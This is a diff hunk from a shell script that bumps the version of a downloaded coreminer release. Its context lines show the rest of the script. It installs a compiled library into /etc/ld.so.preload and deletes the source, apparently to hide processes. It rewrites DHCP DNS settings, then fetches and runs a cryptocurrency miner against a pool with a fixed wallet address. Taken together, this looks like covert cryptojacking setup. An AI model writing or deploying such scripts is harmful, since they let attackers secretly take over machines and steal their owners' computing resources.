@@ -8,7 +8,7 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz
+wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.89/coreminer-linux-x86_64.tar.gz
 tar xf coreminer-linux-x86_64.tar.gz
 cd coreapp
 ./coreminer -P stratum1+tcp://cb24ab8904ed8196c5dafb1306783f2b44890dc5e541.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008 \
